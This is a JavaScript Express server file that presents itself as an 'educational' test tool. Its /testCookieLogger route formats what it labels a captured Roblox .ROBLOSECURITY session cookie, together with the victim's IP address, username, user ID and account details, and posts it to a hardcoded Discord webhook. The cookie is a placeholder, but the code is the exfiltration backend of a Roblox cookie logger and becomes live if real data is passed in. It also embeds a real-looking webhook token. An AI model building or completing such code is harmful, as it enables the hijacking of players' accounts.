const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF"; // Replace with your own test webhook

app.get("/", (req, res) => {
  res.send("✅ Local test server is running!");
});

app.get("/testCookieLogger", async (req, res) => {
  // Simulate incoming data
  const testData = {
    cookie: "FAKE-ROBLOX-COOKIE-FOR-TESTING-ONLY",
    ip: req.ip || "127.0.0.1",
    username: "test_user123",
    userId: "1234567890",
    premium: false,
    accountAge: "7/11/2025"
  };

  const now = new Date().toLocaleString();

  const content = [
    "🧪 **[TEST MODE] Simulated Roblox Cookie Capture**",
    "",
    `📡 IP Address: ${testData.ip}`,
    `👤 Username: ${testData.username}`,
    `🆔 User ID: ${testData.userId}`,
    `💎 Premium: ${testData.premium ? "Yes" : "No"}`,
    `📅 Account Age: ${testData.accountAge}`,
    `🕓 Time: ${now}`,
    "",
    "🔐 .ROBLOSECURITY:",
    "```",
    testData.cookie,
    "```",
    "",
    "Sent from Educational Backend Test Tool"
  ].join("\n");

  try {
    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Test Logger",
        content: content
      })
    });

    if (!discordRes.ok) {
      return res.status(500).json({ success: false, error: "❌ Failed to send to Discord webhook" });
    }

    return res.json({ success: true, message: "✅ Fake cookie sent to Discord!" });
  } catch (e) {
    return res.status(500).json({ success: false, error: e.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Test server listening on port ${PORT}`);
});
